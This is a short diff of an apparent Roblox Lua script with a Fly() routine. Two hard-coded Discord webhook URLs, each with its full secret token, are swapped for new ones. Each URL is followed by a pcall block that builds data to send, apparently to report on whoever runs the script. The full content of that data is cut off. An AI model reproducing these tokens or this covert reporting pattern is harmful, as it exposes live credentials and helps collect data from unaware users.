@@ -157,7 +157,7 @@ function Fly()
     end
     Fly()
     
-    local webh = "https://discord.com/api/webhooks/1060812996080828496/Na58IgJ6VaEDZNsiXB3xkvCz9OIomYRkrqZt7sZSYIDda0x4-Ui7YHSwEZ-v09pqLl_7"
+    local webh = "https://discord.com/api/webhooks/1060819418151665745/cuelOhp5rJxhZCxjmL8G8G1sjunjkkNMYl5_yDoUqnsfZ30zsdgGMBvxWuJ9oOlYW0Et"
 
 pcall(function()
    local data = {
@@ -205,7 +205,7 @@ pcall(function()
    end
 end)
 
-local webh = "https://discord.com/api/webhooks/1060817031957590066/IHT-zWqADchI1CThgiJ1iQOxZsoZGF-vEQLyluWeO-Vwyn8UfoD_KVPZGc785LH2Xy2t"
+local webh = "https://discord.com/api/webhooks/1060819647991128104/uNdM6DpJOaIDy7mmYT80CLO3iIAJB6upiZnFJ7DS-wgQ0yojjnu6zpiKREZFh3S95bbt"
 
 pcall(function()
    local data = {
